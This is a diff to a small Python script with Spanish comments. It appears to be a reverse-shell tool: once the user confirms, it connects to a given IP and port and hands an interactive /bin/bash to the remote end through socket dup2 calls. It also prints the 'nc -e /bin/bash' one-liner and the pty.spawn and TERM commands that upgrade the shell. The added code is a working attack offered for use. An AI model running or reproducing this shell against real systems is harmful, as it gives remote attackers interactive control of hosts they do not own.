@@ -33,15 +33,25 @@ else:
 
 # Confirmar antes de ejecutar
 ejecutar = input(f"\033[92m¿Ejecutar sheldon a {ip} en el puerto {port}? [S/n']: \033[0m").strip().lower()
+
 if ejecutar in ['', 's']:
-    # Imprimir el comando completo a modo indicativo en azul
+    # Mensajes adicionales
+    print_color("_________________________________________________________", 94)
+    print_color("Ejecutar en la otra máquina antes de recibir:", 95)
+    print_color('python3 -c \'import pty; pty.spawn("/bin/bash")\'', 93)
+    print_color("export TERM=xterm-256color", 93)
+    print_color("_________________________________________________________", 94)
+
+    # Imprimir comando indicativo
     print_color(f"nc -e /bin/bash {ip} {port}", 94)
-    
+
+    # Reverse shell real
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
     dup2(s.fileno(), 0)
     dup2(s.fileno(), 1)
     dup2(s.fileno(), 2)
     run(["/bin/bash", "-i"])
+
 else:
     print_color("Operación cancelada.", 91)
